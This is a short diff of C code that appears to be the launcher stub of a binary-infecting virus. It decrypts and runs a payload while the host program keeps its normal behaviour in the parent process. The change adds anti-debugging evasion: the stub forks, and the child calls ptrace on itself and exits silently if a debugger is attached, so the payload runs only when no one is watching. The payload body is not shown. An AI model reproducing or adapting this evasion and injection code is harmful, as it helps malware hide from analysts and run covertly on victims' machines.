@@ -51,10 +51,17 @@ void FORCE_INLINE pop_registers()
 
 int FORCE_INLINE can_be_launch()
 {
-	// if (PTRACE(PTRACE_TRACEME, 0, 0, 0) == -1) // error on bash maybe have to detach
-	// 	return 0;
 	if (is_proc_actif())
 		return 0;
+	if (FORK())
+		return (0); // normal binary behavior for the father
+	else
+	{
+		// CHILD
+		if (PTRACE(PTRACE_TRACEME, 0, 0, 0) == -1)
+			EXIT(0); // some is debugig us !
+		return (1);
+	}
 	return (1);
 }
 
@@ -78,9 +85,7 @@ void payload()
 void start(void)
 {
 	if (can_be_launch())
-	{
 		payload();
-	}
 	EXIT(0);
 }
 
@@ -91,6 +96,7 @@ void payload_start()
 	{
 		decrypt();
 		payload();
+		EXIT(0);
 	}
 	pop_registers();
 	asm volatile (
